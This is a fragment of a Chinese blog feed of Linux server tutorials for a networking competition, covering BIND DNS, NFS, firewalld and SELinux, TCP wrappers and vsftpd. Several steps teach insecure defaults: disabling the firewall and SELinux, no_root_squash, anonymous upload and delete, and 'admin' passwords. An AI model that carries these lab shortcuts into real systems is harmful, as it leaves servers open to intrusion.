会话密钥文件</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">logging &#123;	#  定义 bing 服务的日志</span><br><span class="line">        channel default_debug &#123;		    #  日志输出方式</span><br><span class="line">                file &quot;data&#x2F;named.run&quot;;  #  输出到指定文件</span><br><span class="line">                severity dynamic;	    #  按照服务器当前的 debug 级别记录日志</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;.&quot; IN &#123;			#  定义域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type hint;		    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;named.ca&quot;;	#  指定存放 DNS 记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#  包含区域配置文件，用于设置正反向区域（也可在当前文件中配置正反向区域）</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.rfc1912.zones&quot;;	#  如果把该行注释则 named.rfc1912.zones 文件内的配置无效</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.root.key&quot;;		#  根区域的 key 文件（与事务签名相关）</span><br></pre></td></tr></table></figure>
<h3 id="3、编辑区域配置文件"><a href="#3、编辑区域配置文件" class="headerlink" title="3、编辑区域配置文件"></a>3、编辑区域配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.rfc1912.zones	#  编辑区域文件</span><br><span class="line"></span><br><span class="line">在文件末尾添加正反向区域</span><br><span class="line">zone &quot;test.com&quot; IN &#123;		#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type master;		    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;test.com.zone&quot;;	#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">	allow-update &#123; none; &#125;;	#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;	#  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type master;			        #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;10.1.82.zone&quot;;		#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">	allow-update &#123; none; &#125;;		#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="4、配置正向区域"><a href="#4、配置正向区域" class="headerlink" title="4、配置正向区域"></a>4、配置正向区域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  复制 named.localhost 文件及其属性并改名为 test.com.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.localhost &#x2F;var&#x2F;named&#x2F;test.com.zone</span><br><span class="line"></span><br><span class="line">#  配置正向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@	IN SOA	@ test.com. (</span><br><span class="line">					0	; serial</span><br><span class="line">					1D	; refresh</span><br><span class="line">					1H	; retry</span><br><span class="line">					1W	; expire</span><br><span class="line">					3H )	; minimum</span><br><span class="line">	NS	@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">	A	10.1.82.232      #  域名指向的 IP</span><br><span class="line">www	A	10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">	AAAA	::1</span><br></pre></td></tr></table></figure>
<h3 id="5、配置反向区域"><a href="#5、配置反向区域" class="headerlink" title="5、配置反向区域"></a>5、配置反向区域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  复制 named.loopback 文件及其属性并改名为 10.1.82.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.loopback &#x2F;var&#x2F;named&#x2F;10.1.82.zone</span><br><span class="line"></span><br><span class="line">#  配置反向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@	IN SOA	@ test.com. (</span><br><span class="line">					0	; serial</span><br><span class="line">					1D	; refresh</span><br><span class="line">					1H	; retry</span><br><span class="line">					1W	; expire</span><br><span class="line">					3H )	; minimum</span><br><span class="line">	NS	@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">	A	10.1.82.232      #  域名指向的 IP</span><br><span class="line">www	A	10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">	AAAA	::1</span><br><span class="line">232	PTR	www.test.com.    #  完整的域名跟对应的 IP 后缀（域名后面的点必须有）</span><br></pre></td></tr></table></figure>
<h3 id="6、设置-DNS-解析"><a href="#6、设置-DNS-解析" class="headerlink" title="6、设置 DNS 解析"></a>6、设置 DNS 解析</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;resolv.conf	    #  编辑 DNS 域名解析配置文件</span><br><span class="line"></span><br><span class="line">nameserver 10.1.82.232      #  在 resolv.conf 文件末尾添加该行</span><br></pre></td></tr></table></figure>
<p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p>
<p>配置完后使用 nslookup dig 等工具进行测试即可</p>
<hr>
<h2 id="配置主从-DNS"><a href="#配置主从-DNS" class="headerlink" title="配置主从 DNS"></a>配置主从 DNS</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><strong>环境：</strong></p>
<p>centos 7（主），IP：10.1.82.232<br>centos 7（从），IP：10.1.82.235</p>
<h3 id="二、实例-1"><a href="#二、实例-1" class="headerlink" title="二、实例"></a>二、实例</h3><p>主服务器的配置文件照上正常配置即可</p>
<p>从服务器只需在区域配置文件末尾中添加如下配置即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zone &quot;test.com&quot; IN &#123;			#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;			    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;	    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;test.com.zone&quot;;	#  设置主服务器正向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;	#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;        #  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;                     #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;	    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;10.1.82.zone&quot;;	    #  设置主服务器反向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;	#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p>
<p>配置完后使用 nslookup dig 等工具进行测试即可</p>
]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>NFS</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/NFS/NFS/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>NFS</code>（网络文件系统）能通过网络让不同的机器、系统共享彼此的文件</p>
<p>配置文件（默认为空文件）：<code>/etc/exports</code><br>管理命令：<code>/usr/sbin/exportfs</code><br>共享资源的日志文件：<code>/var/lib/nfs/*tab</code><br>客户端查询共享资源命令：<code>/usr/sbin/showmount</code></p>
<p><code>NFS</code> 服务主要进程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpc.nfsd	#  最主要的 NFS 进程，管理客户端是否可登录</span><br><span class="line">rpc.mountd	#  挂载和卸载 NFS 文件系统，包括权限管理</span><br><span class="line">rpc.lockkd	#  管理文件锁，避免同时写出错（非必要）</span><br><span class="line">rpc.statd	#  检查文件一致性，可修复文件（非必要）</span><br></pre></td></tr></table></figure>


<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p><code>/etc/exports</code> 配置文件常用参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ro		#  只读</span><br><span class="line">rw		#  读写</span><br><span class="line">sync		#  将数据同步写入内存缓冲区与磁盘中（效率低，但可保证数据的一致性）</span><br><span class="line">async		#  将数据先保存在内存缓冲区中，必要时才写入磁盘</span><br><span class="line">insecure	#  允许客户端从大于 1024 的 TCP&#x2F;IP 端口连接服务器</span><br><span class="line">secure（默认）          #  限制客户端只能从小于 1024 的 TCP&#x2F;IP 端口连接旧服务器</span><br><span class="line">wdelay（默认）          #  检查是否有相关的写入操作，如有则将这些写入操作一起执行（该参数为默认参数）</span><br><span class="line">subtree_check（默认）   #  若输出目录是一个子目录，则 NFS 服务器将检查其父目录的权限</span><br><span class="line">no_subtree_check       #  即使输出目录是一个子目录，NFS 服务器也不检查其父目录的权限（可提高效率）</span><br><span class="line">no_wdelay       #  若有写入操作则立即执行（应与 sync 配合使用）</span><br><span class="line">root_squash     #  将来访问的 root 用户映射为匿名用户或用户组</span><br><span class="line">no_root_squash	#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br><span class="line">all_squash      #  所有访问用户都映射为匿名用户或用户组</span><br><span class="line">no_all_squash	#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br></pre></td></tr></table></figure>
<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、编辑配置文件"><a href="#1、编辑配置文件" class="headerlink" title="1、编辑配置文件"></a>1、编辑配置文件</h3><p>配置文件格式为：<code>路径 + IP、掩码 + 参数</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  创建需共享的文件夹</span><br><span class="line">mkdir -p &#x2F;data&#x2F;web_data</span><br><span class="line">#  在 &#x2F;etc&#x2F;exports 配置文件中添加如下内容</span><br><span class="line">&#x2F;data&#x2F;web_data		192.168.1.0&#x2F;24(rw,no_root_squash)</span><br></pre></td></tr></table></figure>
<h3 id="2、刷新配置"><a href="#2、刷新配置" class="headerlink" title="2、刷新配置"></a>2、刷新配置</h3><p>刷新配置：<code>exportfs -a</code></p>
<h3 id="3、重启服务"><a href="#3、重启服务" class="headerlink" title="3、重启服务"></a>3、重启服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SELinux 防火墙</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/SELinux/SELinux/</url>
    <content><![CDATA[<p><strong>注：</strong> 搭建服务前须关闭防火墙（否则会导致服务无法访问）</p>
<h2 id="一、firewalld-防火墙"><a href="#一、firewalld-防火墙" class="headerlink" title="一、firewalld 防火墙"></a>一、firewalld 防火墙</h2><p>查看 firewalld 防火墙状态：<code>systemctl status firewalld</code><br>关闭 firewall 防火墙 <code>systemctl stop firewalld</code></p>
<h2 id="二、SELinux-防火墙"><a href="#二、SELinux-防火墙" class="headerlink" title="二、SELinux 防火墙"></a>二、SELinux 防火墙</h2><p><strong>简介：</strong><br>SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。</p>
<p><strong>SELinux 分三种模式</strong>：<br>Enforcing（强制模式）、Permissive（警告模式）、Disabled（关闭模式）</p>
<p>查看防火墙当前状态：<code>getenforce</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  关闭 SELinux 防火墙</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;selinux&#x2F;config		#  编辑 selinux 防火墙的配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># This file controls the state of SELinux on the system.</span><br><span class="line"># SELINUX&#x3D; can take one of these three values:</span><br><span class="line">#     enforcing - SELinux security policy is enforced.</span><br><span class="line">#     permissive - SELinux prints warnings instead of enforcing.</span><br><span class="line">#     disabled - No SELinux policy is loaded.</span><br><span class="line">SELINUX&#x3D;enforcing	#  需将此处更改为 disabled（默认为 enforcing）</span><br><span class="line"># SELINUXTYPE&#x3D; can take one of three two values:</span><br><span class="line">#     targeted - Targeted processes are protected,</span><br><span class="line">#     minimum - Modification of targeted policy. Only selected processes are protected. </span><br><span class="line">#     mls - Multi Level Security protection.</span><br></pre></td></tr></table></figure>
<p>更改完后输入命令使其生效 <code>setenforce 0</code></p>
]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Hosts.allow、Hosts.deny 文件</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/hosts.allow%E6%96%87%E4%BB%B6%E8%B7%9Fhosts.deny%E6%96%87%E4%BB%B6/hosts.allow%E3%80%81hosts.deny/</url>
    <content><![CDATA[<p><strong>文件优先级：</strong> <code>先 deny，后 allow，如有冲突则按 allow 文件内的规则处理</code></p>
<h2 id="hosts-allow-文件"><a href="#hosts-allow-文件" class="headerlink" title="hosts.allow 文件"></a>hosts.allow 文件</h2><p>hosts.allow 文件内的内容为允许服务列表<br>默认路径：<code>/etc/hosts.allow</code><br>格式：<code>服务名 + IP + allow</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshd:all:allow      #  允许所有主机</span><br><span class="line">sshd:192.168.1.:allow       #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:allow      #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:allow   #  允许 1.0 网段的所有主机</span><br></pre></td></tr></table></figure>

<h2 id="hosts-deny-文件"><a href="#hosts-deny-文件" class="headerlink" title="hosts.deny 文件"></a>hosts.deny 文件</h2><p>hosts.deny 文件内的内容为拒绝服务列表<br>默认路径：<code>/etc/hosts.deny</code><br>格式：<code>服务名 + IP + deny</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshd:all:deny       #  拒绝所有主机</span><br><span class="line">sshd:192.168.1.:deny        #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:deny       #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:deny    #  拒绝 1.0 网段的所有主机</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VSFTP</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>用户以文件操作的方式（如文件的增、删、改、查、传递等）与另一主机互相通信</p>
<p><code>ftp</code> 有 <code>ASCII</code> 模式与 <code>Binary</code>（二进制） 模式</p>
<ul>
<li><code>ASCII</code> 模式用来传递 <code>HTML</code> 和文本编写的文件（如用 <code>Binary</code> 模式传递则会破坏-文件，导致文件执行出错）</li>
<li><code>Binary</code> 模式用来传递可执行文件，压缩文件，和图片文件（如用 <code>ASCII</code> 模式传递，则会乱码）</li>
</ul>
<p>默认端口号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">控制：21</span><br><span class="line">传输：20</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 vsftp <code>yum -y install vsftpd</code></p>
<p>默认配置文件 <code>/etc/vsftpd/vsftpd.conf</code></p>
<p>PAM 认证配置文件路径 <code>/etc/pam.d</code></p>
<p><code>vsftpd.conf</code> 配置文件常用参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  全局设置</span><br><span class="line">listen_port&#x3D;21			#  设置监听端口</span><br><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf	#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">allow_writeable_chroot&#x3D;yes	#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br><span class="line">#  传输</span><br><span class="line">ascii_upload_enable&#x3D;yes		#  启用 ASCII 模式上传数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">ascii_download_enable&#x3D;yes	#  启用 ASCII 模式下载数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">#  被动模式相关（如启用了被动模式，则在客户端使用 ftp 访问时需使用 passive 关闭客户端的被动模式，强制其使用port方式连接。如需开启则再次运行该命令）</span><br><span class="line">pasv_enable&#x3D;yes         #  启用被动模式</span><br><span class="line">pasv_promiscuous&#x3D;yes	#  关闭 PASV 模式的安全检查（该检查确保数据连接和控制连接是来自同一 IP）</span><br><span class="line">pasv_max_port&#x3D;4500	#  PASV 使用的最大端口</span><br><span class="line">pasv_min_port&#x3D;4000	#  PASV 使用的最小端口</span><br><span class="line">pasv_address&#x3D;192.168.1.1	#  PASV 模式传输的地址（访问的客户端 IP 跟此处的 IP 不一致时会报错）</span><br><span class="line">#  限制</span><br><span class="line">max_clients&#x3D;100			#  最大客户端连接数为 100</span><br><span class="line">max_per_ip&#x3D;3			#  每个 IP 最大连接数为  3</span><br><span class="line">deny_file&#x3D;&#123;*.exe,&#39;*root*&#125;	#  禁止上传 .exe 的文件和文件名带有 root 的文件</span><br><span class="line">chroot_list_enable&#x3D;yes		#  启用限制用户的名单</span><br><span class="line">chroot_list_file&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;test	#  在 test 文件内指定用户列表（泽泻用户作为“例外”，不受限制）</span><br><span class="line">chroot_local_user&#x3D;yes		#  所有用户被限制在其主目录下（不能访问除主目录外的其他目录）</span><br><span class="line"></span><br><span class="line">#  匿名用户相关配置</span><br><span class="line">anonymous_enable&#x3D;yes		#  允许匿名用户访问（配置文件内默认有该参数）</span><br><span class="line">anon_root&#x3D;&#x2F;test			#  指定匿名用户目录</span><br><span class="line">#  匿名用户权限相关</span><br><span class="line">anon_upload_enable&#x3D;yes		#  允许匿名用户上传文件（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes	#  允许匿名用户创建目录（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_world_readable_only&#x3D;yes	#  文件权限中其他用户需有可读的权限，匿名用户才能下载（文件权限分：用户、组、其他用户）</span><br><span class="line">anon_umask&#x3D;022		        #  设置匿名用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">#  匿名用户限制相关</span><br><span class="line">anon_max_rate&#x3D;30000		#  匿名用户限速为 30k&#x2F;s</span><br><span class="line">anon_other_write_enable&#x3D;yes	#  匿名用户拥有删除权限</span><br><span class="line"></span><br><span class="line">#  虚拟用户相关</span><br><span class="line">local_root&#x3D;&#x2F;test		#  指定虚拟用户目录（由于是基于本地用户的，所以需使用此行，文件权限设置为 777）</span><br><span class="line">guest_enable&#x3D;yes		#  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp		#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu	#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（默认有该行配置，但文件名为vsftpd）</span><br><span class="line">virtual_use_local_privs&#x3D;yes	#  使虚拟用户跟本地用户权限相同（配置此行后需使用用户的参数来配置虚拟用户）</span><br><span class="line"></span><br><span class="line">#  用户相关配置</span><br><span class="line">local_root&#x3D;&#x2F;test		#  指定用户访问目录</span><br><span class="line">local_umask&#x3D;022			#  设置用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">local_max_rate&#x3D;30000		#  用户限速为 30k&#x2F;s</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="三、配置本地用户访问"><a href="#三、配置本地用户访问" class="headerlink" title="三、配置本地用户访问"></a>三、配置本地用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_root&#x3D;&#x2F;test</span><br></pre></td></tr></table></figure>
<h3 id="2、创建用户"><a href="#2、创建用户" class="headerlink" title="2、创建用户"></a>2、创建用户</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test    #  新建 test 用户</span><br><span class="line">passwd test     #  设置密码（此处需确认密码）</span><br></pre></td></tr></table></figure>
<h3 id="3、创建目录"><a href="#3、创建目录" class="headerlink" title="3、创建目录"></a>3、创建目录</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;test         #  创建目录</span><br><span class="line">chmod 755 &#x2F;test     #  设置目录权限</span><br><span class="line">chown test:test &#x2F;test   #  设置该目录所属用户跟组</span><br></pre></td></tr></table></figure>
<p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p>
<h3 id="4、登陆测试"><a href="#4、登陆测试" class="headerlink" title="4、登陆测试"></a>4、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="四、配置虚拟用户访问"><a href="#四、配置虚拟用户访问" class="headerlink" title="四、配置虚拟用户访问"></a>四、配置虚拟用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf	#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">guest_enable&#x3D;yes		    #  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp		#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu	#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（需注释掉原有的行，并复制原文件另存为 vsftpd.vu）</span><br><span class="line">allow_writeable_chroot&#x3D;yes	#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br></pre></td></tr></table></figure>
<h3 id="2、创建映射的账号并设置虚拟用户的账号跟密码"><a href="#2、创建映射的账号并设置虚拟用户的账号跟密码" class="headerlink" title="2、创建映射的账号并设置虚拟用户的账号跟密码"></a>2、创建映射的账号并设置虚拟用户的账号跟密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  创建虚拟用户映射的用户（该用户不可登陆）</span><br><span class="line">useradd -s &#x2F;sbin&#x2F;nologin virtftp</span><br><span class="line"></span><br><span class="line">#  创建存放用户名跟密码的文件</span><br><span class="line">touch ftpuser.txt</span><br></pre></td></tr></table></figure>
<p><code>ftpuser.txt</code> 文件内容如下（单数行为用户名，双数行为密码）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftpadmin</span><br><span class="line">admin</span><br><span class="line">ftpuser</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
<p>由于保存虚拟用户跟密码的文本无法被直接调用，所以需生成数据库文件：<br><code>db_load -T -t hash -f ftpuser.txt ftpuser.db</code></p>
<h3 id="3、创建用户配置文件"><a href="#3、创建用户配置文件" class="headerlink" title="3、创建用户配置文件"></a>3、创建用户配置文件</h3><p>创建虚拟用户的配置目录及其配置文件：<br><code>mkdir /etc/vsftpd/user_conf</code><br><code>touch /etc/vsftpd/user_conf/ftpadmin</code><br><code>touch /etc/vsftpd/user_conf/ftpuser</code></p>
<p>ftpadmin 配置内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes</span><br><span class="line">anon_other_write_enable&#x3D;yes</span><br><span class="line">anon_umask&#x3D;022</span><br></pre></td></tr></table></figure>
<p>ftpuser 配置内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br></pre></td></tr></table></figure>
<h3 id="4、配置-PAM-认证"><a href="#4、配置-PAM-认证" class="headerlink" title="4、配置 PAM 认证"></a>4、配置 PAM 认证</h3><p>根据 vsftpd.conf 配置将 PAM 认证文件名更改为对应的名称：<br><code>mv /etc/pam.d/vsftpd /etc/pam.d/vsftpd.vu</code></p>
<p>注释 <code>vsftpd.vu</code> 文件内所有行，并在文件末尾添加如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  此处末尾的路径为虚拟用户账号跟密码文件所在的绝对路径（无需后缀名）</span><br><span class="line">auth	required	pam_userdb.so	db&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br><span class="line">account	required	pam_userdb.so	db&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br></pre></td></tr></table></figure>
<p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p>
<h3 id="5、登陆测试"><a href="#5、登陆测试" class="headerlink" title="5、登陆测试"></a>5、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123	#  如服务重启无报错，登陆失败则可能是 PAM 配置文件的问题</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="五、PAM-配置文件简介"><a href="#五、PAM-配置文件简介" class="headerlink" title="五、PAM 配置文件简介"></a>五、PAM 配置文件简介</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器名称    模块类型    控制方式    模块路径    模块参数</span><br></pre></td></tr></table></figure>
<h3 id="服务器名称："><a href="#服务器名称：" class="headerlink" title="服务器名称："></a>服务器名称：</h3><p>设置服务器名称时字母需小写</p>
<h3 id="模块类型："><a href="#模块类型：" class="headerlink" title="模块类型："></a>模块类型：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth        #  接受用户名和密码，进而对该用户的密码进行认证，并负责设置用户的一些秘密信息。</span><br><span class="line">account     #  检查帐户是否被允许登录系统，帐号是否已经过期，帐号的登录是否有时间段的限制等等。</span><br><span class="line">password    #  用来修改用户的密码，检测修改密码动作是否被允许以及新密码是否符合要求等。</span><br><span class="line">session     #  提供对会话的管理和记账。</span><br></pre></td></tr></table></figure>
<h3 id="控制方式："><a href="#控制方式：" class="headerlink" title="控制方式："></a>控制方式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">required    #  表示本模块必须返回成功才能通过认证，但是如果该模块返回失败的话，失败结果也不会立即通知用户，而是要等到同一 stack 中的所有模块全部执行完毕再将失败结果返回给应用程序。可以认为是一个必要条件。</span><br><span class="line">requisite   #  与required类似，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一 stack 内的任何模块，而是直 接将控制权返回给应用程序。是一个必要条件。</span><br><span class="line">sufficient  #  表明本模块返回成功已经足以通过身份认证的要求，不必再执行同一 stack 内的其它模块，但是如果本模块返回失败的话可以忽略。可以认为是一个充分条件。</span><br><span class="line">optional    #  表明本模块是可选的，它的成功与否一般不会对身份认证起关键作用，其返回值一般被忽略。</span><br><span class="line">include     #  将认证权利移交给其他文件。</span><br></pre></td></tr></table></figure>
<h3 id="模块路径："><a href="#模块路径：" class="headerlink" title="模块路径："></a>模块路径：</h3><p>设置模块路径（需绝对路径）</p>
<h3 id="模块参数："><a href="#模块参数：" class="headerlink" title="模块参数："></a>模块参数：</h3><p>传递给改模块的参数</p>
]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Network</title>
